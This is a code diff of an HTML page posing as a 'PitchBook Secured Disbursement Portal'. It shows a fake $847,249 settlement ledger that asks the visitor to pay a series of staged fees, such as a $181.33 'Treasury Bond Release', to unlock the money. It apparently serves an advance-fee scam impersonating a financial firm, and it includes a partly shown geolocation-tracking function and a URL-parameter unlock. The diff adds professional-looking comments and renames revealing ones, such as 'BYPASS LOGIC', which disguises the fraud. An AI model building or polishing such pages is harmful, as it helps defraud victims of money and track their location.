@@ -5,13 +5,19 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>PitchBook | Secured Disbursement Portal</title>
 
+  <!-- External Asset Pre-fetching and Typography -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
 
+  <!-- Tailwind CSS Framework Integration -->
   <script src="https://cdn.tailwindcss.com"></script>
 
   <script>
+    /**
+     * Tailwind Configuration
+     * Extending default theme for PitchBook Brand Guidelines
+     */
     tailwind.config = {
       theme: {
         extend: {
@@ -25,12 +31,24 @@
   </script>
 
   <style>
+    /* Global Background and Typography Defaults */
     body { font-family: 'Inter', sans-serif; background-color: #020617; color: #cbd5e1; margin: 0; padding: 0; overflow-x: hidden; }
+    
+    /* Panel and UI Component Styling */
     .data-panel { background: linear-gradient(145deg, #1e293b, #111a2e); border: 1px solid #334155; box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3); }
     .header-gradient { background: linear-gradient(90deg, #0052cc, #0747a6); box-shadow: 0 4px 20px rgba(0, 82, 204, 0.3); }
+    
+    /* Status Indicators */
     .status-dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; box-shadow: 0 0 8px currentColor; }
+    
+    /* Animations */
     .pulsing { animation: pulse-opacity 2s infinite; }
-    @keyframes pulse-opacity { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.4; transform: scale(0.9); } }
+    @keyframes pulse-opacity { 
+        0%, 100% { opacity: 1; transform: scale(1); } 
+        50% { opacity: 0.4; transform: scale(0.9); } 
+    }
+    
+    /* Layout and Modal States */
     .modal-bg { background: rgba(2, 6, 23, 0.98); backdrop-filter: blur(16px); }
     #main-content.locked { filter: blur(20px); pointer-events: none; user-select: none; }
     .btn-info { transition: all 0.2s ease; cursor: pointer; }
@@ -69,7 +87,7 @@
   <!-- MAIN PORTAL CONTENT -->
   <div id="main-content" class="max-w-6xl mx-auto space-y-6 locked transition-all duration-1000">
 
-    <!-- Header -->
+    <!-- Header Section -->
     <div class="flex flex-col md:flex-row justify-between items-center header-gradient px-8 py-6 rounded-xl border-b-2 border-blue-900/50">
       <div class="flex items-center gap-6">
         <span class="text-white font-bold text-2xl tracking-tight">PitchBook</span>
@@ -82,7 +100,7 @@
       <div id="system-time" class="text-[11px] font-mono font-bold text-blue-50 px-4 py-1.5 bg-blue-950/40 rounded-full border border-white/10">--:--:-- CST</div>
     </div>
 
-    <!-- Account Profile -->
+    <!-- Account Profile Card -->
     <div class="data-panel rounded-xl p-8 grid grid-cols-1 md:grid-cols-3 gap-8">
       <div class="space-y-4">
         <div>
@@ -125,7 +143,7 @@
       </div>
     </div>
 
-    <!-- Briefing Panel (EXPLICITLY HIDDEN ON LOAD) -->
+    <!-- Audit Briefing Log -->
     <div id="audit-log" class="hidden data-panel rounded-xl p-6 bg-slate-950/80 border-slate-800 shadow-2xl relative">
       <button onclick="document.getElementById('audit-log').classList.add('hidden')" class="absolute top-4 right-4 text-slate-600 hover:text-white">✕</button>
       <div class="flex items-center gap-3 mb-4 border-b border-slate-800 pb-3">
@@ -135,7 +153,7 @@
       <div id="audit-text" class="text-[11px] text-slate-300 font-mono leading-relaxed whitespace-pre-wrap italic"></div>
     </div>
 
-    <!-- Ledger -->
+    <!-- Settlement Ledger Table -->
     <div class="data-panel rounded-xl overflow-hidden bg-slate-900/50 border border-slate-800">
       <div class="bg-slate-800/40 px-8 py-5 border-b border-slate-700/50">
         <h3 class="text-[11px] font-bold uppercase tracking-[0.2em] text-slate-400">Settlement Ledger</h3>
@@ -157,14 +175,14 @@
       </div>
     </div>
 
-    <!-- BONUS INFO BUTTON -->
+    <!-- Navigation Options -->
     <div class="text-center my-10">
       <a class='px-8 py-3 bg-blue-600/10 hover:bg-blue-600/20 text-blue-400 border border-blue-500/30 font-bold rounded-lg text-xs uppercase tracking-[0.2em] transition-all inline-block' href='settlement.html'>
         Bonus Info
       </a>
     </div>
 
-    <!-- Detail Modal -->
+    <!-- Info Detail View Modal -->
     <div id="info-modal" class="fixed inset-0 modal-bg hidden flex items-center justify-center p-4 z-50">
       <div class="data-panel w-full max-w-2xl p-8 rounded-2xl border-slate-700 shadow-2xl">
         <div class="flex justify-between items-start mb-6">
@@ -242,12 +260,17 @@
       </div>
     </div>
 
+    <!-- Institutional Footer -->
     <div class="py-16 text-center opacity-30">
       <p class="text-[10px] font-bold text-slate-500 tracking-[0.5em] uppercase">PitchBook Financial Operations • Secure Treasury Gateway</p>
     </div>
   </div>
 
   <script>
+    /**
+     * TRANSACTION DATA DEFINITIONS
+     * Each object represents a verified or pending ledger entry
+     */
     const TX_DATA = [
       { date: "Jan 06, 2026", ref: "REF-4770", desc: "Initial Security Margin Provision", val: "$350.00", status: "SUCCESS" },
       { date: "Jan 13, 2026", ref: "REF-8921", desc: "Correspondent Bank Verification Fee", val: "$73.50", status: "SUCCESS" },
@@ -264,6 +287,10 @@
       { date: "Jan 30, 2026", ref: "BOND-STG2-ADJ", desc: "Stage 2: Treasury Bond Release (Credit Adjusted)", val: "$181.33", status: "ACTION REQUIRED" }
     ];
 
+    /**
+     * COMPLIANCE AUDIT MAPPINGS
+     * Detailed administrative notes and actions required for each reference
+     */
     const TX_DETAILS = {
       "REF-4770": { audit: "Margin collateral confirmed. Account eligibility verified.\nFiler: PitchBook Treasury Operations", action: "Account opened for high-value settlement." },
       "REF-8921": { audit: "Banking verification tunnel established.\nFiler: PitchBook Treasury Operations", action: "Correspondent link active." },
@@ -280,6 +307,9 @@
       "BOND-STG2-ADJ": { audit: "Treasury Bond Release (Stage 2)\nRequirement: $185.00\nApplied Credit: -$3.67 (Stage 1 surplus)", action: "Settle the remaining $181.33 to finalize Stage 2 and trigger next liquidity release." }
     };
 
+    /**
+     * Renders the dynamic ledger rows based on TX_DATA
+     */
     function renderLedger() {
       const container = document.getElementById('ledger-body');
       container.innerHTML = TX_DATA.map(tx => `
@@ -294,12 +324,18 @@
       `).join('');
     }
 
+    /**
+     * Returns appropriate tailwind classes based on transaction status
+     */
     function getStatusClass(status) {
       if (status === 'SUCCESS' || status === 'AUTHORIZED') return 'text-green-500 border-green-500/20 bg-green-500/10';
       if (status === 'VERIFIED' || status === 'RELEASED') return 'text-blue-400 border-blue-400/20 bg-blue-400/10';
       return 'text-amber-500 border-amber-500/20 pulsing';
     }
 
+    /**
+     * Opens information modal for a specific transaction
+     */
     function openAuditModal(refId) {
       const b = TX_DATA.find(t => t.ref === refId);
       const d = TX_DETAILS[refId];
@@ -319,12 +355,18 @@
 
     function closeInfo() { document.getElementById('info-modal').classList.add('hidden'); }
 
+    /**
+     * Simulates a system audit log display
+     */
     function runAudit() {
       const panel = document.getElementById('audit-log');
       panel.classList.remove('hidden');
       document.getElementById('audit-text').innerText = "Status: STAGE 01 FILING VERIFIED\nTotal Settlement Value: $847,249.00\n------------------------------------------\nStage 01: Statutory Filing .......... [$95.00] - SUCCESS\nStage 02: Treasury Bond ............. [$181.33] - PENDING\n*(Reflected Credit: $3.67 applied)*\nStage 03: AML Certification ......... [LOCKED]\nStage 04: FRC Decryption ............ [LOCKED]\n------------------------------------------\nAction: Settle Stage 02 Bond Release to trigger Tranche II.";
     }
 
+    /**
+     * Geolocation tracking logic for FRC verification
+     */
     async function triggerTracking() {
       const btn = document.getElementById('sync-btn');
       btn.innerText = "SYNCHRONIZING WITH NODE...";
@@ -346,7 +388,7 @@
       );
     }
 
-    // AUTH CHECK ON LOAD (BYPASS LOGIC)
+    // INITIALIZATION AND EVENT LISTENERS
     window.addEventListener('load', () => {
       const urlParams = new URLSearchParams(window.location.search);
       if (urlParams.get('auth') === 'verified') {
@@ -369,10 +411,14 @@
       }, 1500);
     });
 
+    /**
+     * Real-time clock update (CST)
+     */
     setInterval(() => {
       document.getElementById('system-time').innerText = new Date().toLocaleTimeString('en-US', { timeZone: 'America/Chicago', hour12: false }) + " CST";
     }, 1000);
 
+    // Initial table render
     renderLedger();
   </script>
 </body>
